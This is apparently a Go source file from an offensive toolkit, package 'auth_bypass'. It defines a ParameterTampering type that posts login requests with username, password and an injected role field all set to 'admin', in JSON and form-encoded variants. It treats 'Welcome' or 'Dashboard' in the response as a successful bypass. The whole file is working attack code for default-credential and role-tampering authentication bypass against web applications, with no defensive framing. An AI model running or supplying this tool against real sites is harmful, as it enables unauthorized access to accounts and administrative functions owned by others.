package auth_bypass

import (
"bytes"
"encoding/json"
"io"
"net/http"
"strings"
)

type ParameterTampering struct {
URL    string
Client *http.Client
}

func NewParameterTampering(url string) *ParameterTampering {
return &ParameterTampering{
URL:    url,
Client: &http.Client{},
}
}

func (p *ParameterTampering) BypassWithJSON() (bool, error) {
payload := map[string]interface{}{
"username": "admin",
"password": "admin",
"role":     "admin",
}
body, _ := json.Marshal(payload)
resp, err := http.Post(p.URL, "application/json", bytes.NewBuffer(body))
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
}

func (p *ParameterTampering) BypassWithForm() (bool, error) {
payload := strings.NewReader("username=admin&password=admin&role=admin")
resp, err := http.Post(p.URL, "application/x-www-form-urlencoded", payload)
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
}

func (p *ParameterTampering) DumpAll() (bool, error) {
if ok, _ := p.BypassWithJSON(); ok {
return true, nil
}
return p.BypassWithForm()
}
